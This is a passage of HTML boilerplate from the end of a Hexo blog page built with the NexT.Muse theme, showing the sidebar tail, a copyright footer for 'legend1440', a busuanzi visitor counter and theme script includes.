        <span class="site-state-item-name">分类</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Sun Jan 18 2026 08:00:00 GMT+0800 (GMT+08:00) – 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">legend1440</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
